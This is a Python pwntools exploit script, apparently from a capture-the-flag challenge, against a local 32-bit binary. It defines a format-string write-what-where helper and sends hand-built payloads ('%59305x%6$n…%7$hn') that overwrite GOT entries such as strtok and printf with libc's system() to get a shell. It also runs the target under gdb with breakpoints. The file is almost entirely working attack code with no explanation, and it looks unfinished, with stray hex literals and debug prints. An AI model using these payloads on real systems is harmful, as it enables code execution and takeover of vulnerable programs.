from pwn import *
context.os = "linux"
context.arch = "i386"
context.terminal = ["tmux", "new-window"]

def writeWhatWhere(what, where, offset=0):
    addr1 = p32(where)              # address for first 2 bytes
    addr2 = p32(where + 2)          # address last 2 bytes
    what1 = (what & 0xffff)         # first 2 bytes
    what2 = (what >> 16) & 0xffff   # last 2 bytes
    backToZero = 0x10000 - what1    # back to zero the first 2 bytes
    return addr1 + addr2 + bytes('%0{}x'.format(what1 - 8) + '%{}$hn'.format(offset) +\
    '%0{}x'.format(backToZero) + '%0{}x'.format(what2) + '%{}$hn'.format(offset + 1), 'utf-8')

elf = ELF('./bin')
libc = ELF('./libc.so.6')

shell = next(libc.search(b'/bin/sh'))
# print(hex(shell))

exitLibc = libc.symbols['exit']
systemLibc = libc.symbols['system']

print(hex(exitLibc)) #0x2e7b0


# print(hex(exitLibc))
# print(hex(systemLibc))
printGOT = 0x804a00c
fgetsGOT = 0x804a010
strtokGOT = 0x804a020




# P = gdb.debug('./bin', '''
#               break *parse_loop+81
#               break *parse_loop+134
#               continue
#               ''')
P = gdb.debug('./bin', '''
              break *parse_loop+134
              continue
              ni
              x/x 0x804a020
              ''')
# P = process('./bin')
offset = 6
# P.sendline(writeWhatWhere(1, strtokGOT, offset))
P.sendline(p32(strtokGOT) + p32(strtokGOT + 2) + b"%59305x%6$n" + b"%6226x" + b"%7$hn")
P.sendline(b"BBBBBB")

print(0xe7b0 - 0xf + 0x8)
print(0x10000 - 0xe7b0)
#b' \xa0\x04\x08"\xa0\x04\x08%059304x%6$hn%06224x%02x%7$hn'

# P.sendline(b"AAAA" + b"%08x."*10)

# offset = 8
# P.sendline(b"//bin/sh" + writeWhatWhere(systemLibc, printGOT, offset))
# P.sendline(b"BBBBBB")
# print(P.recvuntil(b"in"))

0x0803a010
0x0803a00f
#0x08048406
P.interactive()
#0x0006e7af